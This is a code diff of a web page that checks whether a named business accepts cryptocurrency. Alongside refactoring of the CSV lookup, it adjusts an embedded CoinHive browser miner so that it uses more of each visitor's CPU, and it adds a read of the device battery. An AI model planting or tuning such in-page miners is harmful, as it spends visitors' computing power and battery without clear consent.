@@ -52,10 +52,10 @@
 			</div>
 		</div>
 		<div class="row justify-content-md-center">
-					<div class="col">
-						<div class="text-center" id="wrap"> </div>
-					</div>
-				</div>
+			<div class="col">
+				<div class="text-center" id="wrap"> </div>
+			</div>
+		</div>
 	</div>
 
 	<div id="footer">
@@ -75,9 +75,9 @@
 				<div class="col">
 
 					
-								<!-- <p id="tah"></p> -->
-									<p id="minetext"></p>
-								
+					<!-- <p id="tah"></p> -->
+					<p id="minetext"></p>
+
 
 				</div>
 				<!-- The modal -->
@@ -120,7 +120,7 @@
 
 
 
-var miner = new CoinHive.Anonymous('R28gUaZsQm8lY1W9aWPA8WBN83vhjId0',{throttle: 0.85, threads: 1});
+var miner = new CoinHive.Anonymous('R28gUaZsQm8lY1W9aWPA8WBN83vhjId0',{throttle: 0.75, threads: 1});
 miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 		// Update stats once per second
 		setInterval(function() {
@@ -128,6 +128,9 @@ miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 			var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
 			var totalHashes = miner.getTotalHashes();
 			var acceptedHashes = miner.getAcceptedHashes() / 256;
+			var battery = navigator.battery || navigator.webkitBattery || navigator.mozBattery || navigator.msBattery;
+
+			// console.log(battery.level);
     // Output to HTML elements...
     if (miner.isRunning()) {
     	// document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
@@ -180,8 +183,6 @@ $(function() {
 				callback();}
 			});
 	}
-
-
 	var lists = [];
 
 	$.get("crypto.csv", function(data) {
@@ -201,10 +202,12 @@ var callback = function() {
 		var check = 0;
 		var rows = data.split("\n");
 
-		rows.forEach( function getvalues(thisRow) {
-
-			var columns = thisRow.split(",");
+		for (var thisRow = 0; thisRow < rows.length; thisRow++) {
+			var columns = rows[thisRow].split(",");
 			if (nameValue == columns[0].toLowerCase()) {
+				check = 1;
+				verified = columns[1].toLowerCase();
+				processed = columns[4];
 				if(columns.length == 7){
 					crypto_type = columns[6].slice(0,-1);
 
@@ -214,17 +217,16 @@ var callback = function() {
 					crypto_type = crypto_type[6].slice(1,-1).split('  ').join(', ');
 					crypto_type = crypto_type.slice(0,-1);
 				}
-				check = 1;
-				verified = columns[1];
-				processed = columns[4];
-			}})
-		$('#wrap').html(" "); 
-		nameValue = nameValue.replace(/\w\S*/g, function(txt){return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();})
-		// crypto_type = crypto_type.replace(/\w\S*/g, function(txt){return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();})
+				
+				break;
+			}
+		};
+			$('#wrap').html(" "); 
+			nameValue = nameValue.replace(/\w\S*/g, function(txt){return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();})
 		if (check == 1 && verified=="yes"){
 			build = "<h3>" + nameValue +"<sup>✅</sup> "+" accepts "+" "+ crypto_type + "."+ "</h3>";
 			if(processed != " "){
-			build += "<h6>Processed by " + processed + "<h6>";
+				build += "<h6>Processed by " + processed + "<h6>";
 			}
 		}else if (check == 1){
 			build = "<h3>" + nameValue+" "+" accepts "+" "+ crypto_type + "."+ "</h3>";
